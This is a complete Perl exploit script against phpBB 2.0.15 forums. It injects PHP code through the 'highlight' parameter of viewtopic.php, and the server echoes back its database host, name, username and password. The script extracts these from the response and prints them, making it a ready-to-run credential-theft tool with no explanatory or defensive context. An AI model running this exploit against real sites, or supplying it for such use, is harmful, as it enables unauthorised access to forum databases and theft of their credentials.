#Show db-info for phpBB 2.0.15

#!/usr/bin/perl

use IO::Socket;

$host = $ARGV[0];
$forumdir = $ARGV[1];
$thread = $ARGV[2];

$limiter = "UNIKLIMITER";

$string = "${forumdir}viewtopic.php?t=${thread}&highlight='.printf(${limiter}.\$dbhost.${limiter}.\$dbname.${limiter}.\$dbuser.${limiter}.\$dbpasswd.${limiter}).'";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80")
or die "Connection error\n";

print $sock "GET $string HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n";

while ($answer = <$sock>) {
	$limitIndex = index $answer, $limiter;
	if ($limitIndex >= 0) {
		$succes = 1;
		$urlIndex = index $answer, "href";
		if ($urlIndex < 0){
			$answer = substr($answer, length($limiter));
			$length = 0;
			while (length($answer) > 0) {
				$nex = index($answer, $limiter);
				if ($nex > 0) {
					push(@array, substr($answer, 0, $nex));
					$answer = substr($answer, $nex + length($limiter), length($answer));
				} else {
					$answer= "";
				}
			}
		}
	}
}

close($sock);

if ($succes == 1) {
print "db host: ${array[0]}\n";
print "db name: ${array[1]}\n";
print "db user: ${array[2]}\n";
print "db pass: ${array[3]}\n";
} else {
print "Forum error\n";
}
